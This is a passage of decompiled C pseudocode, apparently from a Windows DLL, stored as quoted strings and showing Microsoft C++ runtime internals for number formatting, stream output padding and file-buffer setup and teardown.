    "  v12 = v7 & 0xE00;",
    "  if ( v12 == 1024 )",
    "  {",
    "    v13 = 111;",
    "  }",
    "  else if ( v12 == 2048 )",
    "  {",
    "    v13 = ~(8 * v7) & 0x20 | 0x58;",
    "  }",
    "  else",
    "  {",
    "    v13 = 117;",
    "  }",
    "  v11[1] = v13;",
    "  v11[2] = 0;",
    "  v14 = sub_1800012A0((int)v20, 64, (int)&v17, a6);",
    "  sub_180008AB0(a1, a2, (unsigned int)&v16, v9, a5, (__int64)v20, v14);",
    "  return a2;",
    "}",
    "",
    "",
    "__int64 __fastcall sub_180007C10(int a1, __int64 a2, __int128 *a3, __int64 a4, char a5, unsigned int a6)",
    "{",
    "  __int128 v6; // xmm0",
    "  int v7; // eax",
    "  int v9; // ebx",
    "  char *v11; // rcx",
    "  int v12; // edx",
    "  char v13; // al",
    "  int v14; // eax",
    "  __int128 v16; // [rsp+40h] [rbp-88h] BYREF",
    "  char v17; // [rsp+50h] [rbp-78h] BYREF",
    "  char v18; // [rsp+51h] [rbp-77h] BYREF",
    "  char v19; // [rsp+52h] [rbp-76h] BYREF",
    "  _BYTE v20[64]; // [rsp+60h] [rbp-68h] BYREF",
    "",
    "  v6 = *a3;",
    "  v7 = *(_DWORD *)(a4 + 24);",
    "  v17 = 37;",
    "  v16 = v6;",
    "  v9 = a4;",
    "  if ( (v7 & 0x20) != 0 )",
    "    v18 = 43;",
    "  v11 = &v18;",
    "  if ( (v7 & 0x20) != 0 )",
    "    v11 = &v19;",
    "  if ( (v7 & 8) != 0 )",
    "    *v11++ = 35;",
    "  *v11 = 108;",
    "  v12 = v7 & 0xE00;",
    "  if ( v12 == 1024 )",
    "  {",
    "    v13 = 111;",
    "  }",
    "  else if ( v12 == 2048 )",
    "  {",
    "    v13 = ~(8 * v7) & 0x20 | 0x58;",
    "  }",
    "  else",
    "  {",
    "    v13 = 100;",
    "  }",
    "  v11[1] = v13;",
    "  v11[2] = 0;",
    "  v14 = sub_1800012A0((int)v20, 64, (int)&v17, a6);",
    "  sub_180008AB0(a1, a2, (unsigned int)&v16, v9, a5, (__int64)v20, v14);",
    "  return a2;",
    "}",
    "",
    "",
    "_OWORD *__fastcall sub_180007D10(__int64 a1, _OWORD *a2, __int128 *a3, __int64 a4, unsigned __int8 a5, char a6)",
    "{",
    "  _OWORD *v8; // rbx",
    "  __int64 *v9; // rbx",
    "  void (__fastcall ***v10)(_QWORD, __int64); // rax",
    "  __int64 v11; // rax",
    "  __m128i v12; // xmm6",
    "  unsigned __int8 *v13; // xmm7_8",
    "  __int64 v14; // rdi",
    "  __int64 v15; // r14",
    "  __int64 v16; // rdi",
    "  __int128 v17; // xmm0",
    "  __int64 v18; // rbx",
    "  int *v19; // rcx",
    "  unsigned __int8 **v20; // rcx",
    "  unsigned __int8 *v21; // rdx",
    "  int v22; // eax",
    "  __int128 v23; // xmm0",
    "  unsigned __int8 *v24; // rsi",
    "  unsigned __int8 *v25; // r12",
    "  __int64 v26; // rbx",
    "  int v27; // r8d",
    "  int *v28; // rcx",
    "  _BYTE **v29; // rcx",
    "  _BYTE *v30; // rdx",
    "  int v31; // eax",
    "  __int64 v32; // rbx",
    "  int *v33; // rcx",
    "  unsigned __int8 **v34; // rcx",
    "  unsigned __int8 *v35; // rdx",
    "  int v36; // eax",
    "  __int64 v37; // rdx",
    "  __int128 v39; // [rsp+38h] [rbp-79h] BYREF",
    "  __m128i v40; // [rsp+48h] [rbp-69h]",
    "  __int128 v41; // [rsp+58h] [rbp-59h]",
    "  _OWORD *v42; // [rsp+68h] [rbp-49h]",
    "  __int128 v43; // [rsp+70h] [rbp-41h] BYREF",
    "  __m128i v44; // [rsp+80h] [rbp-31h]",
    "",
    "  v8 = a2;",
    "  v42 = a2;",
    "  if ( (*(_DWORD *)(a4 + 24) & 0x4000) != 0 )",
    "  {",
    "    *((_QWORD *)&v39 + 1) = *(_QWORD *)(*(_QWORD *)(a4 + 64) + 8LL);",
    "    (*(void (**)(void))(**((_QWORD **)&v39 + 1) + 8LL))();",
    "    v9 = (__int64 *)sub_18000ABA0(&v39);",
    "    if ( *((_QWORD *)&v39 + 1) )",
    "    {",
    "      v10 = (void (__fastcall ***)(_QWORD, __int64))(*(__int64 (__fastcall **)(_QWORD))(**((_QWORD **)&v39 + 1) + 16LL))(*((_QWORD *)&v39 + 1));",
    "      if ( v10 )",
    "        (**v10)(v10, 1);",
    "    }",
    "    v43 = 0;",
    "    v44.m128i_i64[0] = 0;",
    "    v44.m128i_i64[1] = 15;",
    "    LOBYTE(v43) = 0;",
    "    v11 = *v9;",
    "    if ( a6 )",
    "      (*(void (__fastcall **)(__int64 *, __int128 *))(v11 + 56))(v9, &v39);",
    "    else",
    "      (*(void (__fastcall **)(__int64 *, __int128 *))(v11 + 48))(v9, &v39);",
    "    v12 = v40;",
    "    v13 = (unsigned __int8 *)v39;",
    "    v44 = v40;",
    "    v43 = v39;",
    "    v14 = *(_QWORD *)(a4 + 40);",
    "    v15 = v40.m128i_i64[0];",
    "    if ( v14 <= 0 || (unsigned __int64)v14 <= v40.m128i_i64[0] )",
    "      v16 = 0;",
    "    else",
    "      v16 = v14 - v40.m128i_i64[0];",
    "    if ( (*(_DWORD *)(a4 + 24) & 0x1C0) != 0x40 )",
    "    {",
    "      v17 = *a3;",
    "      v41 = *a3;",
    "      if ( v16 )",
    "      {",
    "        v18 = *((_QWORD *)&v41 + 1);",
    "        do",
    "        {",
    "          if ( !v18",
    "            || (!**(_QWORD **)(v18 + 64) || (v19 = *(int **)(v18 + 88), *v19 <= 0)",
    "              ? (v22 = (*(__int64 (__fastcall **)(__int64, _QWORD))(*(_QWORD *)v18 + 24LL))(v18, a5))",
    "              : (--*v19, v20 = *(unsigned __int8 ***)(v18 + 64), v21 = *v20, ++*v20, *v21 = a5, v22 = a5),",
    "                v22 == -1) )",
    "          {",
    "            LOBYTE(v41) = 1;",
    "          }",
    "          --v16;",
    "        }",
    "        while ( v16 );",
    "        v17 = v41;",
    "      }",
    "      *a3 = v17;",
    "      v16 = 0;",
    "    }",
    "    v23 = *a3;",
    "    v39 = *a3;",
    "    v24 = (unsigned __int8 *)&v43;",
    "    v25 = v13;",
    "    *(_QWORD *)&v41 = _mm_srli_si128(v12, 8).m128i_u64[0];",
    "    if ( (unsigned __int64)v41 > 0xF )",
    "      v24 = v13;",
    "    if ( v15 )",
    "    {",
    "      v26 = *((_QWORD *)&v39 + 1);",
    "      do",
    "      {",
    "        v27 = *v24;",
    "        if ( !v26",
    "          || (!**(_QWORD **)(v26 + 64) || (v28 = *(int **)(v26 + 88), *v28 <= 0)",
    "            ? (v31 = (*(__int64 (__fastcall **)(__int64, _QWORD))(*(_QWORD *)v26 + 24LL))(v26, *v24))",
    "            : (--*v28, v29 = *(_BYTE ***)(v26 + 64), v30 = *v29, ++*v29, *v30 = v27, v31 = v27),",
    "              v31 == -1) )",
    "        {",
    "          LOBYTE(v39) = 1;",
    "        }",
    "        ++v24;",
    "        --v15;",
    "      }",
    "      while ( v15 );",
    "      v23 = v39;",
    "    }",
    "    *(_QWORD *)(a4 + 40) = 0;",
    "    v39 = v23;",
    "    if ( v16 )",
    "    {",
    "      v32 = *((_QWORD *)&v39 + 1);",
    "      do",
    "      {",
    "        if ( !v32",
    "          || (!**(_QWORD **)(v32 + 64) || (v33 = *(int **)(v32 + 88), *v33 <= 0)",
    "            ? (v36 = (*(__int64 (__fastcall **)(__int64, _QWORD))(*(_QWORD *)v32 + 24LL))(v32, a5))",
    "            : (--*v33, v34 = *(unsigned __int8 ***)(v32 + 64), v35 = *v34, ++*v34, *v35 = a5, v36 = a5),",
    "              v36 == -1) )",
    "        {",
    "          LOBYTE(v39) = 1;",
    "        }",
    "        --v16;",
    "      }",
    "      while ( v16 );",
    "      v23 = v39;",
    "    }",
    "    v8 = v42;",
    "    *v42 = v23;",
    "    if ( (unsigned __int64)v41 > 0xF )",
    "    {",
    "      v37 = v41 + 1;",
    "      if ( (unsigned __int64)(v41 + 1) >= 0x1000 )",
    "      {",
    "        v37 = v41 + 40;",
    "        v25 = (unsigned __int8 *)*((_QWORD *)v13 - 1);",
    "        if ( (unsigned __int64)(v13 - v25 - 8) > 0x1F )",
    "          invalid_parameter_noinfo_noreturn();",
    "      }",
    "      sub_1800116E0(v25, v37);",
    "    }",
    "  }",
    "  else",
    "  {",
    "    v39 = *a3;",
    "    (*(void (__fastcall **)(__int64, _OWORD *, __int128 *))(*(_QWORD *)a1 + 72LL))(a1, a2, &v39);",
    "  }",
    "  return v8;",
    "}",
    "",
    "",
    "__int64 __fastcall sub_180008040(__int64 a1, __int64 a2)",
    "{",
    "  __int64 v4; // rcx",
    "  __int64 v5; // rcx",
    "  bool v6; // al",
    "  __int64 v7; // rcx",
    "",
    "  *(_QWORD *)a1 = a2;",
    "  v4 = *(_QWORD *)(*(int *)(*(_QWORD *)a2 + 4LL) + a2 + 72);",
    "  if ( v4 )",
    "    (*(void (__fastcall **)(__int64))(*(_QWORD *)v4 + 8LL))(v4);",
    "  v5 = *(int *)(*(_QWORD *)a2 + 4LL);",
    "  if ( *(_DWORD *)(v5 + a2 + 16) )",
    "  {",
    "    v6 = 0;",
    "  }",
    "  else",
    "  {",
    "    v7 = *(_QWORD *)(v5 + a2 + 80);",
    "    if ( !v7 || v7 == a2 )",
    "    {",
    "      v6 = 1;",
    "    }",
    "    else",
    "    {",
    "      sub_180009180(v7);",
    "      v6 = *(_DWORD *)(*(int *)(*(_QWORD *)a2 + 4LL) + a2 + 16) == 0;",
    "    }",
    "  }",
    "  *(_BYTE *)(a1 + 8) = v6;",
    "  return a1;",
    "}",
    "",
    "",
    "__int64 __fastcall sub_180008120(__int64 a1, __int64 a2)",
    "{",
    "  __int64 result; // rax",
    "",
    "  result = (*(__int64 (__fastcall **)(__int64))(*(_QWORD *)a2 + 24LL))(a2);",
    "  if ( (_BYTE)result )",
    "  {",
    "    *(_QWORD *)(a1 + 104) = 0;",
    "  }",
    "  else",
    "  {",
    "    *(_QWORD *)(a1 + 104) = a2;",
    "    *(_QWORD *)(a1 + 24) = a1 + 8;",
    "    *(_QWORD *)(a1 + 32) = a1 + 16;",
    "    *(_QWORD *)(a1 + 56) = a1 + 40;",
    "    *(_QWORD *)(a1 + 64) = a1 + 48;",
    "    *(_QWORD *)(a1 + 80) = a1 + 72;",
    "    result = a1 + 76;",
    "    *(_QWORD *)(a1 + 88) = a1 + 76;",
    "    *(_QWORD *)(a1 + 16) = 0;",
    "    *(_QWORD *)(a1 + 48) = 0;",
    "    *(_DWORD *)(a1 + 76) = 0;",
    "    *(_QWORD *)(a1 + 8) = 0;",
    "    *(_QWORD *)(a1 + 40) = 0;",
    "    *(_DWORD *)(a1 + 72) = 0;",
    "  }",
    "  return result;",
    "}",
    "",
    "",
    "bool __fastcall sub_1800081A0(__int64 a1)",
    "{",
    "  int v2; // eax",
    "  int v3; // eax",
    "  __int64 v5; // rdi",
    "  _BYTE *v6; // [rsp+30h] [rbp-38h] BYREF",
    "  _BYTE v7[32]; // [rsp+38h] [rbp-30h] BYREF",
    "  __int64 v8; // [rsp+58h] [rbp-10h] BYREF",
    "",
    "  if ( !*(_QWORD *)(a1 + 104) || !*(_BYTE *)(a1 + 113) )",
    "    return 1;",
    "  if ( (*(unsigned int (__fastcall **)(__int64, __int64))(*(_QWORD *)a1 + 24LL))(a1, 0xFFFFFFFFLL) == -1 )",
    "    return 0;",
    "  v2 = (*(__int64 (__fastcall **)(_QWORD, __int64, _BYTE *, __int64 *, _BYTE **))(**(_QWORD **)(a1 + 104) + 64LL))(",
    "         *(_QWORD *)(a1 + 104),",
    "         a1 + 116,",
    "         v7,",
    "         &v8,",
    "         &v6);",
    "  if ( !v2 )",
    "  {",
    "    *(_BYTE *)(a1 + 113) = 0;",
    "    goto LABEL_10;",
    "  }",
    "  v3 = v2 - 1;",
    "  if ( !v3 )",
    "  {",
    "LABEL_10:",
    "    if ( v6 == v7 )",
    "      return *(_BYTE *)(a1 + 113) == 0;",
    "    v5 = v6 - v7;",
    "    if ( v5 == sub_18001FFA8(v7, 1, v6 - v7) )",
    "      return *(_BYTE *)(a1 + 113) == 0;",
    "    return 0;",
    "  }",
    "  if ( v3 != 2 )",
    "    return 0;",
    "  *(_BYTE *)(a1 + 113) = 0;",
    "  return 1;",
    "}",
    "",
    "",
    "__int64 __fastcall sub_180008290(__int64 a1, __int64 a2, int a3)",
    "{",
    "  _QWORD *v3; // r10",
    "  _QWORD *v4; // r9",
    "  bool v6; // zf",
    "  _QWORD *v8; // r8",
    "  _DWORD *v9; // rdx",
    "  _QWORD *v10; // rcx",
    "  __int64 v11; // rax",
    "  __int64 v12; // rax",
    "  __int64 v13; // rax",
    "  __int64 result; // rax",
    "  __int64 v15; // [rsp+20h] [rbp-28h] BYREF",
    "  __int64 v16; // [rsp+28h] [rbp-20h] BYREF",
    "  __int64 v17; // [rsp+30h] [rbp-18h] BYREF",
    "",
    "  *(_BYTE *)(a1 + 113) = 0;",
    "  v3 = (_QWORD *)(a1 + 8);",
    "  *(_QWORD *)(a1 + 24) = a1 + 8;",
    "  v4 = (_QWORD *)(a1 + 40);",
    "  *(_QWORD *)(a1 + 56) = a1 + 40;",
    "  v6 = a3 == 1;",
    "  v8 = (_QWORD *)(a1 + 16);",
    "  *(_QWORD *)(a1 + 32) = a1 + 16;",
    "  v9 = (_DWORD *)(a1 + 72);",
    "  *(_QWORD *)(a1 + 80) = a1 + 72;",
    "  *(_BYTE *)(a1 + 124) = v6;",
    "  v10 = (_QWORD *)(a1 + 48);",
    "  *(_QWORD *)(a1 + 64) = v10;",
    "  *(_QWORD *)(a1 + 88) = a1 + 76;",
    "  *v8 = 0;",
    "  *v10 = 0;",
    "  *(_DWORD *)(a1 + 76) = 0;",
    "  *v3 = 0;",
    "  *v4 = 0;",
    "  *v9 = 0;",
    "  if ( a2 )",
    "  {",
    "    v15 = 0;",
    "    v16 = 0;",
    "    v17 = 0;",
    "    sub_180017428(a2, &v15, &v16, &v17);",
    "    v11 = v15;",
    "    *(_QWORD *)(a1 + 24) = v15;",
    "    *(_QWORD *)(a1 + 32) = v11;",
    "    v12 = v16;",
    "    *(_QWORD *)(a1 + 56) = v16;",
    "    *(_QWORD *)(a1 + 64) = v12;",
    "    v13 = v17;",
    "    *(_QWORD *)(a1 + 80) = v17;",
    "    *(_QWORD *)(a1 + 88) = v13;",
    "  }",
    "  *(_QWORD *)(a1 + 128) = a2;",
    "  result = qword_18004E1D8;",
    "  *(_QWORD *)(a1 + 116) = qword_18004E1D8;",
    "  *(_QWORD *)(a1 + 104) = 0;",
    "  return result;",
    "}",
    "",
    "",
    "__int64 __fastcall sub_180008390(__int64 a1)",
    "{",
    "  _QWORD *v2; // r8",
    "  __int64 v3; // rdx",
    "  __int64 v4; // rcx",
    "  __int64 v5; // rbx",
    "  int v6; // eax",
    "  __int64 v7; // r9",
    "  __int64 result; // rax",
    "  __int64 v9; // rcx",
    "",
    "  if ( *(_QWORD *)(a1 + 128) )",
    "  {",
    "    v2 = *(_QWORD **)(a1 + 24);",
    "    if ( *v2 == a1 + 112 )",
    "    {",
    "      v3 = *(_QWORD *)(a1 + 144);",
    "      v4 = *(_QWORD *)(a1 + 136);",
    "      *v2 = v4;",
    "      **(_QWORD **)(a1 + 56) = v4;",
    "      **(_DWORD **)(a1 + 80) = v3 - v4;",
    "    }",
    "    v5 = 0;",
    "    if ( sub_1800081A0(a1) )",
    "      v5 = a1;",
    "    v6 = sub_180020498(*(_QWORD *)(a1 + 128));",
    "    v7 = 0;",
    "    if ( !v6 )",
    "      v7 = v5;",
    "  }",
    "  else",
    "  {",
    "    v7 = 0;",
    "  }",
    "  *(_BYTE *)(a1 + 124) = 0;",
    "  *(_QWORD *)(a1 + 88) = a1 + 76;",
    "  *(_QWORD *)(a1 + 24) = a1 + 8;",
    "  *(_BYTE *)(a1 + 113) = 0;",
    "  *(_QWORD *)(a1 + 56) = a1 + 40;",
    "  *(_QWORD *)(a1 + 32) = a1 + 16;",
    "  *(_QWORD *)(a1 + 80) = a1 + 72;",
    "  result = v7;",
    "  *(_QWORD *)(a1 + 64) = a1 + 48;",
    "  *(_QWORD *)(a1 + 16) = 0;",
    "  *(_QWORD *)(a1 + 48) = 0;",
    "  *(_DWORD *)(a1 + 76) = 0;",
    "  **(_QWORD **)(a1 + 24) = 0;",
    "  **(_QWORD **)(a1 + 56) = 0;",
    "  **(_DWORD **)(a1 + 80) = 0;",
    "  *(_QWORD *)(a1 + 128) = 0;",
    "  v9 = qword_18004E1D8;",
    "  *(_QWORD *)(a1 + 104) = 0;",
    "  *(_QWORD *)(a1 + 116) = v9;",
    "  return result;",
    "}",
    "",
    "",
    "__int64 __fastcall sub_180008490(__int64 a1, __int64 a2)",
    "{",
    "  __int64 v4; // rbx",
    "  __int64 v5; // rsi",
    "  __int64 v6; // rax",
    "  __int64 v7; // rax",
    "  __int64 v8; // rax",
    "  __int64 v9; // rdx",
    "  __int64 v10; // rcx",
    "  __int64 v11; // rax",
    "  void (__fastcall ***v12)(_QWORD, __int64); // rax",
    "  __int64 v14; // rcx",
    "  int v15; // eax",
    "  int v16; // eax",
    "  int v17; // eax",
    "  const char *v18; // rbx",
    "  __m128i *v19; // rax",
    "  _QWORD pExceptionObject[5]; // [rsp+30h] [rbp-68h] BYREF",
    "  __int64 v21; // [rsp+58h] [rbp-40h] BYREF",
    "  __int64 v22; // [rsp+60h] [rbp-38h]",
    "  __int64 v23; // [rsp+68h] [rbp-30h] BYREF",
    "  __int64 v24; // [rsp+70h] [rbp-28h] BYREF",
    "",
    "  *(_QWORD *)a1 = &unk_180044A6C;",
    "  *(_QWORD *)(a1 + 184) = 0;",
    "  *(_QWORD *)(a1 + 192) = 0;",
    "  *(_DWORD *)(a1 + 200) = 0;",
    "  *(_QWORD *)(a1 + 208) = 0;",
    "  *(_QWORD *)(a1 + 216) = 0;",
    "  *(_QWORD *)(a1 + 224) = 0;",
    "  *(_QWORD *)(a1 + 232) = 0;",
    "  *(_QWORD *)(a1 + 240) = 0;",
    "  *(_QWORD *)(a1 + 176) = &off_18003A530;",
    "  *(_QWORD *)(a1 + 248) = 0;",
    "  *(_QWORD *)(a1 + 256) = 0;",
    "  *(_BYTE *)(a1 + 264) = 0;",
    "  v4 = a1 + 16;",
    "  sub_180008790(a1, a1 + 16);",
    "  *(_QWORD *)(*(int *)(*(_QWORD *)a1 + 4LL) + a1) = &off_180044B58;",
    "  *(_DWORD *)(*(int *)(*(_QWORD *)a1 + 4LL) + a1 - 4) = *(_DWORD *)(*(_QWORD *)a1 + 4LL) - 176;",
    "  v21 = v4;",
    "  sub_1800094E0(v4);",
    "  *(_QWORD *)v4 = &off_18003A5D0;",
    "  *(_BYTE *)(v4 + 124) = 0;",
    "  *(_BYTE *)(v4 + 113) = 0;",
    "  *(_QWORD *)(v4 + 24) = v4 + 8;",
    "  *(_QWORD *)(v4 + 32) = v4 + 16;",
    "  *(_QWORD *)(v4 + 56) = v4 + 40;",
    "  *(_QWORD *)(v4 + 64) = v4 + 48;",
    "  *(_QWORD *)(v4 + 80) = v4 + 72;",
    "  *(_QWORD *)(v4 + 88) = v4 + 76;",
    "  *(_QWORD *)(v4 + 16) = 0;",
    "  *(_QWORD *)(v4 + 48) = 0;",
    "  *(_DWORD *)(v4 + 76) = 0;",
    "  *(_QWORD *)(v4 + 8) = 0;",
    "  *(_QWORD *)(v4 + 40) = 0;",
    "  *(_DWORD *)(v4 + 72) = 0;",
    "  *(_QWORD *)(v4 + 128) = 0;",
    "  *(_QWORD *)(v4 + 116) = qword_18004E1D8;",
    "  *(_QWORD *)(v4 + 104) = 0;",
    "  v5 = sub_180010AB8(a2, 1, 64);",
    "  if ( v5 )",
    "  {",
    "    *(_BYTE *)(v4 + 124) = 1;",
    "    *(_BYTE *)(v4 + 113) = 0;",
    "    *(_QWORD *)(v4 + 24) = v4 + 8;",
    "    *(_QWORD *)(v4 + 32) = v4 + 16;",
    "    *(_QWORD *)(v4 + 56) = v4 + 40;",
    "    *(_QWORD *)(v4 + 64) = v4 + 48;",
    "    *(_QWORD *)(v4 + 80) = v4 + 72;",
    "    *(_QWORD *)(v4 + 88) = v4 + 76;",
    "    *(_QWORD *)(v4 + 16) = 0;",
    "    *(_QWORD *)(v4 + 48) = 0;",
    "    *(_DWORD *)(v4 + 76) = 0;",
    "    *(_QWORD *)(v4 + 8) = 0;",
    "    *(_QWORD *)(v4 + 40) = 0;",
    "    *(_DWORD *)(v4 + 72) = 0;",
    "    v23 = 0;",
    "    v24 = 0;",
    "    v21 = 0;",
    "    sub_180017428(v5, &v23, &v24, &v21);",
    "    v6 = v23;",
    "    *(_QWORD *)(v4 + 24) = v23;",
    "    *(_QWORD *)(v4 + 32) = v6;",
    "    v7 = v24;",
    "    *(_QWORD *)(v4 + 56) = v24;",
    "    *(_QWORD *)(v4 + 64) = v7;",
    "    v8 = v21;",
    "    *(_QWORD *)(v4 + 80) = v21;",
    "    *(_QWORD *)(v4 + 88) = v8;",
    "    *(_QWORD *)(v4 + 128) = v5;",
    "    *(_QWORD *)(v4 + 116) = qword_18004E1D8;",
    "    *(_QWORD *)(v4 + 104) = 0;",
    "    v22 = *(_QWORD *)(*(_QWORD *)(v4 + 96) + 8LL);",
    "    (*(void (__fastcall **)(__int64, __int64))(*(_QWORD *)v22 + 8LL))(v10, v9);",
    "    v11 = sub_180009F60(&v21);",
    "    sub_180008120(v4, v11);",
    "    if ( v22 )",
    "    {",
    "      v12 = (void (__fastcall ***)(_QWORD, __int64))(*(__int64 (__fastcall **)(__int64))(*(_QWORD *)v22 + 16LL))(v22);",
    "      if ( v12 )",
    "        (**v12)(v12, 1);",
    "    }",
    "  }",
    "  else",
    "  {",
    "    v14 = a1 + *(int *)(*(_QWORD *)a1 + 4LL);",
    "    v15 = 6;",
    "    if ( *(_QWORD *)(v14 + 72) )",
    "      v15 = 2;",
    "    v16 = (*(_DWORD *)(v14 + 16) | v15) & 0x17;",
    "    *(_DWORD *)(v14 + 16) = v16;",
    "    v17 = *(_DWORD *)(v14 + 20) & v16;",
    "    if ( v17 )",
    "    {",
    "      if ( (v17 & 4) != 0 )",
    "      {",
    "        v18 = \"ios_base::badbit set\";",
    "      }",
    "      else",
    "      {",
    "        v18 = \"ios_base::failbit set\";",
    "        if ( (v17 & 2) == 0 )",
    "          v18 = \"ios_base::eofbit set\";",
    "      }",
    "      v19 = (__m128i *)unknown_libname_1(&v21, 1);",
    "      sub_180001E10(pExceptionObject, (__int64)v18, v19);",
    "      throw (std::ios_base::failure *)pExceptionObject;",
    "    }",
    "  }",
    "  return a1;",
    "}",
    "",
    "",
    "_QWORD *__fastcall sub_180008790(_QWORD *a1, __int64 a2)",
    "{",
    "  char *v4; // rsi",
    "  __int64 v5; // rbx",
    "  __int64 v6; // rcx",
    "  __int64 v7; // rax",
    "  __int64 v8; // rdx",
    "  char v9; // bl",
    "  void (__fastcall ***v10)(_QWORD, __int64); // rax",
    "  int v11; // eax",
    "  int v12; // eax",
    "  const char *v14; // rbx",
    "  __m128i *v15; // rax",
    "  char v16[8]; // [rsp+20h] [rbp-58h] BYREF",
    "  __int64 v17; // [rsp+28h] [rbp-50h]",
    "  _QWORD pExceptionObject[6]; // [rsp+30h] [rbp-48h] BYREF",
    "",
    "  *(_QWORD *)((char *)a1 + *(int *)(*a1 + 4LL)) = &off_180044A80;",
    "  *(_DWORD *)((char *)a1 + *(int *)(*a1 + 4LL) - 4) = *(_DWORD *)(*a1 + 4LL) - 24;",
    "  a1[1] = 0;",
    "  v4 = (char *)a1 + *(int *)(*a1 + 4LL);",
    "  *((_QWORD *)v4 + 8) = 0;",
    "  *((_QWORD *)v4 + 1) = 0;",
    "  *((_DWORD *)v4 + 5) = 0;",
    "  *((_DWORD *)v4 + 6) = 513;",
    "  *((_QWORD *)v4 + 4) = 6;",
    "  *((_QWORD *)v4 + 5) = 0;",
    "  *((_QWORD *)v4 + 6) = 0;",
    "  *((_QWORD *)v4 + 7) = 0;",
    "  *((_DWORD *)v4 + 4) = 0;",
    "  v5 = sub_180011714(16);",
    "  *(_OWORD *)v5 = 0;",
    "  LOBYTE(v6) = 1;",
    "  *(_QWORD *)(v5 + 8) = sub_1800101C0(v6);",
    "  *((_QWORD *)v4 + 8) = v5;",
    "  *((_QWORD *)v4 + 9) = a2;",
    "  *((_QWORD *)v4 + 10) = 0;",
    "  v17 = *(_QWORD *)(v5 + 8);",
    "  (*(void (**)(void))(*(_QWORD *)v17 + 8LL))();",
    "  v7 = sub_180009900(v16);",
    "  LOBYTE(v8) = 32;",
    "  v9 = (*(__int64 (__fastcall **)(__int64, __int64))(*(_QWORD *)v7 + 64LL))(v7, v8);",
    "  if ( v17 )",
    "  {",
    "    v10 = (void (__fastcall ***)(_QWORD, __int64))(*(__int64 (__fastcall **)(__int64))(*(_QWORD *)v17 + 16LL))(v17);",
    "    if ( v10 )",
    "      (**v10)(v10, 1);",
    "  }",
    "  v4[88] = v9;",
    "  if ( !*((_QWORD *)v4 + 9) )",
    "  {",
    "    v11 = *((_DWORD *)v4 + 4) & 0x13 | 4;",
    "    *((_DWORD *)v4 + 4) = v11;",
    "    v12 = *((_DWORD *)v4 + 5) & v11;",
    "    if ( v12 )",
    "    {",
    "      if ( (v12 & 4) != 0 )",
    "      {",
    "        v14 = \"ios_base::badbit set\";",
    "      }",
    "      else",
    "      {",
    "        v14 = \"ios_base::failbit set\";",
    "        if ( (v12 & 2) == 0 )",
    "          v14 = \"ios_base::eofbit set\";",
    "      }",
    "      v15 = (__m128i *)unknown_libname_1(v16, 1);",
    "      sub_180001E10(pExceptionObject, (__int64)v14, v15);",
    "      throw (std::ios_base::failure *)pExceptionObject;",
    "    }",
    "  }",
    "  return a1;",
    "}",
    "",
    "",
    "__int64 __fastcall sub_180008910(_QWORD *a1, __int64 a2, unsigned __int64 a3)",
    "{",
    "  __int64 v5; // rcx",
    "  unsigned __int64 v6; // r8",
    "  _QWORD *v7; // rax",
    "  char *v8; // rbx",
    "",
    "  v5 = a1[2];",
    "  v6 = a1[3];",
    "  if ( a3 > v6 - v5 )",
    "    return sub_18000AEE0((_DWORD)a1, a3, 0, a2, a3);",
    "  a1[2] = v5 + a3;",
    "  v7 = a1;",
    "  if ( v6 > 0xF )",
    "    v7 = (_QWORD *)*a1;",
    "  v8 = (char *)v7 + v5;",
    "  sub_180036160((char *)v7 + v5, a2, a3);",
    "  v8[a3] = 0;",
    "  return (__int64)a1;",
    "}",
    "",
    "",
    "_QWORD *__fastcall sub_1800089A0(_QWORD *a1, char a2)",
    "{",
    "  *a1 = &off_18003A3C0;",
    "  if ( (a2 & 1) != 0 )",
    "    sub_1800116E0(a1, 16);",
    "  return a1;",
    "}",
    "",
    "",
    "__int64 __fastcall sub_1800089D0(__int64 a1, __int64 a2)",
    "{",
    "  __int64 v3; // rdx",
    "  __int64 v4; // r8",
    "",
    "  v3 = *(_QWORD *)(a1 + 40);",
    "  v4 = -1;",
    "  *(_OWORD *)a2 = 0;",
    "  *(_QWORD *)(a2 + 16) = 0;",
    "  *(_QWORD *)(a2 + 24) = 0;",
    "  do",
    "    ++v4;",
    "  while ( *(_BYTE *)(v3 + v4) );",
    "  sub_18000A3D0(a2, v3, v4);",
    "  return a2;",
    "}",
    "",
    "",
    "__int64 __fastcall sub_180008A10(__int64 a1, __int64 a2)",
    "{",
    "  __int64 v3; // rdx",
    "  __int64 v4; // r8",
    "",
    "  v3 = *(_QWORD *)(a1 + 32);",
    "  v4 = -1;",
    "  *(_OWORD *)a2 = 0;",
    "  *(_QWORD *)(a2 + 16) = 0;",
    "  *(_QWORD *)(a2 + 24) = 0;",
    "  do",
    "    ++v4;",
    "  while ( *(_BYTE *)(v3 + v4) );",
    "  sub_18000A3D0(a2, v3, v4);",
    "  return a2;",
    "}",
    "",
    "",
    "__int64 __fastcall sub_180008A50(__int64 a1, __int64 a2)",
    "{",
    "  __int64 v3; // rdx",
    "  __int64 v4; // r8",
    "",
    "  v3 = *(_QWORD *)(a1 + 16);",
    "  v4 = -1;",
    "  *(_OWORD *)a2 = 0;",
    "  *(_QWORD *)(a2 + 16) = 0;",
    "  *(_QWORD *)(a2 + 24) = 0;",
    "  do",
    "    ++v4;",
    "  while ( *(_BYTE *)(v3 + v4) );",
    "  sub_18000A3D0(a2, v3, v4);",
    "  return a2;",
    "}",
    "",
    "",
    "_OWORD *__fastcall sub_180008AB0(",
    "        __int64 a1,",
    "        _OWORD *a2,",
    "        __int128 *a3,",
    "        __int64 a4,",
    "        unsigned __int8 a5,",
    "        _BYTE *a6,",
    "        unsigned __int64 a7)",
    "{",
    "  __int128 *v8; // r15",
    "  unsigned __int64 v9; // rsi",
    "  __int64 v10; // r13",
    "  __int64 v11; // rdi",
    "  void (__fastcall ***v12)(_QWORD, __int64); // rax",
    "  _QWORD *v13; // r9",
    "  __int64 v14; // rbx",
    "  void (__fastcall ***v15)(_QWORD, __int64); // rax",
    "  char *v16; // rdi",
    "  char v17; // r15",
    "  char i; // al",
    "  unsigned __int64 v19; // rcx",
    "  unsigned __int64 v20; // r8",
    "  _QWORD *v21; // rbx",
    "  char *v22; // rbx",
    "  unsigned __int64 v23; // r12",
    "  __int64 v24; // rdi",
    "  unsigned __int64 v25; // rdi",
    "  int v26; // eax",
    "  __int128 v27; // xmm0",
    "  __int64 v28; // rbx",
    "  int *v29; // rcx",
    "  unsigned __int8 **v30; // rcx",
    "  unsigned __int8 *v31; // rdx",
    "  int v32; // eax",
    "  unsigned __int8 *v33; // rsi",
    "  __int64 v34; // r15",
    "  __int64 v35; // rbx",
    "  int v36; // r8d",
    "  int *v37; // rcx",
    "  _BYTE **v38; // rcx",
